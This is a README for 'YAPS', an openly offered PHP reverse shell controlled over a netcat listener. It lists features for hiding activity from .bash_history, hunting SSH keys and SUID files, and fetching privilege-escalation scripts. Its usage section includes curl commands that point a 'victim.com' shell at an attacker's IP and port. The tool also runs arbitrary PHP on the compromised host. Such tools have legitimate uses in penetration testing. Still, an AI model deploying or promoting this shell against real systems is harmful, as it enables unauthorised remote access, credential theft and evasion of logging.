# YAPS - **Y**et **A**nother **P**HP **S**hell

Yeah, I know, I know... But that's it. =)

As the name reveals, this is yet another PHP reverse shell, one more among hundreds available out there. It is a single PHP file containing all its functions and you can control it via a simple netcat listener (`nc -lp 1337`).

In the current version (1.0), its main functions support only linux systems, but i'm planning to make it work with Windows too.

It's currently in its first version and I haven't tested it much yet, and *there are still many things I intend to do and improve for the next versions (**it's not done yet!**)*, so please let me know if you've found any bugs. =)

## Features
* Single PHP file (no need to install packages, libs, or download tons of files)
* Works with netcat, ncat, socat, multi/handler, almost any listener
* Customizable password protection
* No logs in .bash_history
* Can do some enumeration
  * Network info (interfaces, iptables rules, active ports)
  * User info
  * List SUID and GUID files
  *  Search for SSH keys (public and private)
  *  List crontab
  *  List writable PHP files
* Auto download LinPEAS, LinEnum or Linux Exploit Suggester
* Write and run PHP code on remote host
* (Semi) Stabilize shell

## Cons
* Connection isn't encrypted (yet) (nc does not support SSL)
* Not fully interactive (although you can spawn an interactive shell with `!stabilize`)
  * CTRL+C breaks it; can't use arrows to navigate (unless you use `rlwrap nc -lp <ip> <port>`)

## Usage
1. Set up a TCP listener;
2. Set your IP and port. This can be done by:
* 2.1 Editing the variables at the start of the script;
* 2.2 Setting them via web request (`curl -x POST -d "x=ip&y=port" victim.com/yaps.php` or `curl victim.com/yaps.php?x=ip&y=port`);
3. Open yaps.php on browser or curl it;
* 3.1 You can set `yaps.php?s` or `yaps.php?silent` to supress the banner
5. Hack!

## Working commands
* `!help - Display the help menu`
* `!all-colors - Toggle all colors (compatible with colorless TTY)`
* `!color - Toggle PS1 color (locally only, no environment variable is changed)`
* `!enum - Download LinPEAS and LinEnum to /tmp and get them ready to use`
* `!info - list informations about the target (the enumeration I mentioned above)`
* `!stabilize - Spawn an interactive reverse shell on another port (works w/ sudo, su, mysql, etc.)`
* `!passwd - Password option (enable, disable, set, modify)`
* `!php - Write and run PHP on the remote host`
* `!suggester - Download Linux Exploit Suggester to /tmp and get it ready to use`

## Screenshots

![image](https://user-images.githubusercontent.com/3837916/124825185-acd24480-df49-11eb-976f-f9db9328eabe.png)

![image](https://user-images.githubusercontent.com/3837916/124777687-c4dca080-df16-11eb-94b7-ef77127c5f20.png)

![image](https://user-images.githubusercontent.com/3837916/124775570-1b48df80-df15-11eb-8a3d-90090e8b8016.png)

![image](https://user-images.githubusercontent.com/3837916/124774830-7dedab80-df14-11eb-9e84-c8d88b9f4de2.png)

![image](https://user-images.githubusercontent.com/3837916/124776296-b641b980-df15-11eb-9a3c-396fe1544825.png)

## Changelog

**v1.1 - 12/07/2021**
- Added `!all-colors` to toggle terminal colors and work with colorless TTYs
- Added `exit` command to close socket (leave shell)
- Changed payload in `!stabilize` to unset HISTSIZE and HISTFILE
- Changed the method of obtaining CPU and meminfo in `!info` 

**v1.0.1 - 08/07/2021**
- Changed `[x,y,z]` to `array(x,y,z)` to improve compatibility with older PHP versions
- Changed payload for interactive shell to work with PHP<5.4

## Credits
Some ideas were inspired by this tools:

#### Linpeas
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

#### Linenum
https://github.com/rebootuser/LinEnum

#### Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

#### Pentest Monkey
https://github.com/pentestmonkey/php-reverse-shell
